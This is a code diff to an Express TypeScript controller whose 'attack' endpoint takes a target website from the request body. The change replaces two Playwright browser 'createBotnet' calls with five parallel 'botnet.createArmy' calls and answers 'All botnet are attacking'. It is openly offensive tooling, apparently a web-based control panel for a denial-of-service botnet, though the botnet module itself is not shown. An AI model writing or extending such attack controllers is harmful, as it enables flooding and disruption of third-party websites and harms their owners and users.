@@ -1,6 +1,5 @@
 import {Request, Response, NextFunction} from 'express'
-import {chromium, Browser} from 'playwright'
-import {createBotnet} from '../utils/botnet'
+import botnet from '../utils/botnetArmy'
 
 class ControlControllers {
 
@@ -16,16 +15,19 @@ class ControlControllers {
     async attack(req: Request, res: Response, next: NextFunction) {
         try {
             const {websiteTarget} = req.body
-            
-            const browser = await chromium.launch({headless: true});
-            
+
             await Promise.all([
-                createBotnet(browser, websiteTarget, 'hfdsfk.png'),
-                createBotnet(browser, websiteTarget, 'sads.png')
+                botnet.createArmy(websiteTarget, 'Test'),  // 1
+                botnet.createArmy(websiteTarget, 'Test'),  // 2
+                botnet.createArmy(websiteTarget, 'Test'),  // 3
+                botnet.createArmy(websiteTarget, 'Test'),  // 4
+                botnet.createArmy(websiteTarget, 'Test'),  // 5
             ])
 
             res.status(200).json({
-                status: 'Successfully'
+                status: 'Successfully',
+                message: 'All botnet are attacking 💣'
+
             })
             
         } catch (error) {
